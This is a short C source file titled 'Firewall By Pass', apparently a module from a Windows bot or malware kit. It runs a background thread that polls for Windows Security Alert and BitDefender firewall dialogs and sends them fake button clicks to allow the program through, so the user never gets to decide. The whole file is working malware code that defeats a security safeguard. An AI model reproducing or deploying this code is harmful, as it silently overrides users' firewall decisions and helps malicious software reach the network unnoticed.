////////////////////////////////
//     Firewall By Pass       //
////////////////////////////////
#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_BYPASS

DWORD WINAPI BypassThread(LPVOID)
{
    while(1)
    {
        HWND wnd = 0;
       
        if( (wnd = fFindWindow(0, "Windows Security Alert")) )
        {
            // Click the "allow" button.
            fSendMessage(wnd, WM_COMMAND, MAKEWORD(104,BN_CLICKED ), 0);
            // wait for the window to close
            while( fIsWindow(wnd) ) Sleep(50);
         break;
        }
        else if( (wnd = fFindWindow(0, "BitDefender Firewall Alert")) )
        {
            // Click the "remember" button (Doesn't work right now)
            fSendMessage(wnd, WM_COMMAND, MAKEWORD(13133, BN_CLICKED ), 0);
            // Click the okay button
            fSendMessage(wnd, WM_COMMAND, MAKEWORD(IDOK,BN_CLICKED ), 0);
            // Wait for the window to close
            while( fIsWindow(wnd) ) Sleep(50);
         break;
        }
        Sleep(30); // Don't use 100% CPU
    }
    return 0;
} 
#endif